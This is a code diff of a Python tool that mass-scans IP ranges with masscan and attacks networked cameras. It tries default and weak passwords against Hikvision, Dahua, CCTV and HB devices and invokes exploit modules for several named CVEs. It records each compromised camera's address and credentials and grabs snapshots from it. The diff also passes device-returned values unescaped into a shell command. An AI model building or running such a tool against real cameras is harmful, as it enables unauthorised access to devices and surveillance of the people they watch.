@@ -10,28 +10,34 @@ sys.path.append(os.path.join(CWD, '..'))
 from scan.modules import *
 from utils.net import get_all_ip, get_ip_seg_len
 from utils.base import multi_thread, process_bar, save_res
+from utils.config import *
 
 
 class Base:
     """Base class"""
-    def __init__(self, in_file: str, out_file: str) -> None:
+    def __init__(self, in_file: str, out_path: str) -> None:
         self.in_file = in_file
-        self.out_file = out_file
+        self.out_path = out_path
         self.scanner_name = 'base'  # Need to be respecified in subclass
+        if not os.path.isdir(out_path):
+            os.mkdir(out_path)
 
 
 class MasScaner(Base):
     """This scanner need root authority"""
-    def __init__(self, in_file: str, out_file: str) -> None:
-        super().__init__(in_file, out_file)
+    def __init__(self, in_file: str, out_path: str) -> None:
+        super().__init__(in_file, out_path)
         self.scanner_name = 'masscan'
-        self.tmp = 'tmp'  # temp out file
+        self.tmp = os.path.join(out_path, 'tmp')  # temp out file
 
     def parse(self, tmp: str='tmp') -> None:
         with open(tmp, 'r') as tf:
-            with open(self.out_file, 'w') as of:
-                for i in [line.split()[-2] for line in tf if not line.startswith('#')]:
-                    of.write(i + '\n')
+            with open(os.path.join(self.out_path, 'masscan_res'), 'w') as of:
+                for line in tf:
+                    if 'open' in line:
+                        items = line.split()
+                        ip, port = items[-2], items[2]
+                        of.write(f"{ip}:{port}\n")
 
     def __call__(self, args) -> None:
         os.system(f"sudo masscan --exclude 255.255.255.255 -iL {self.in_file} -p{args.port} --rate {args.rate} -oL {self.tmp}")
@@ -40,8 +46,8 @@ class MasScaner(Base):
 
 class CameraScanner(Base):
 
-    def __init__(self, in_file: str, out_file: str) -> None:
-        super().__init__(in_file, out_file)
+    def __init__(self, in_file: str, out_path: str) -> None:
+        super().__init__(in_file, out_path)
         self.scanner_name = 'camera scanner'
         self.lock = Lock()
         self.ip_list = []
@@ -54,6 +60,7 @@ class CameraScanner(Base):
         self._get_ip()
 
     def _get_ip(self):
+        """get ip / ip segment, and count the number"""
         with open(self.in_file, 'r') as f:
             for line in f:
                 if line.strip() and not line.startswith('#'):
@@ -66,26 +73,35 @@ class CameraScanner(Base):
                 self.found += 1
             self.bar(self.total, self.done + 1, self.found, timer=True, start_time=self.start_time)
 
-    def scan(self, ip_term):
-        for ip in get_all_ip(ip_term):
+    def scan(self, ip_term: str):
+        if ':' in ip_term: _targets = [ip_term]
+        else: _targets = get_all_ip(ip_term)
+        for ip in _targets:
             for mod in self.modules:
                 found = False
                 try:
                     res = mod(ip)
-                    if res[0]:
+                    if res[0] == True:  # found vulnerability
                         found = True
-                        save_res(self.out_file, [ip] + res[1:])
-                except Exception as e: pass  # print(e)
+                        if ':' not in ip: port = '80'
+                        else: ip, port = ip.split(':')
+                        camera_info = [ip, port] + res[1:]
+                        save_res(camera_info, self.out_path)  # save result
+                        os.system(f"python3 -Bu utils/camera.py --ip '{camera_info[0]}'"
+                                  f" --port '{camera_info[1]}' --user '{camera_info[2]}' --passwd '{camera_info[3]}'"
+                                  f" --device '{camera_info[4]}' --vulnerability '{camera_info[5]}'"
+                                  f" --sv_path {self.out_path} > /dev/null 2> /dev/null")  # save snapshot if possible
+                except Exception as e: pass
                 finally: self._step(found=found)
             with self.lock: self.done += 1
 
 
     def __call__(self, args):
         self.modules = []
-        hik_weak_partial = partial(hik_weak, users=args.users, passwords=args.passwords)
-        dahua_weak_partial = partial(dahua_weak, users=args.users, passwords=args.passwords)
-        cctv_weak_partial = partial(cctv_weak, users=args.users, passwords=args.passwords)
-        hb_weak_partial = partial(hb_weak, users=args.users, passwords=args.passwords)
+        hik_weak_partial = partial(hik_weak, users=USERS, passwords=PASSWORDS)
+        dahua_weak_partial = partial(dahua_weak, users=USERS, passwords=PASSWORDS)
+        cctv_weak_partial = partial(cctv_weak, users=USERS, passwords=PASSWORDS)
+        hb_weak_partial = partial(hb_weak, users=USERS, passwords=PASSWORDS)
 
         if args.all:
             self.modules.extend([cve_2017_7921, cve_2021_36260, cve_2020_25078, cve_2021_33044])
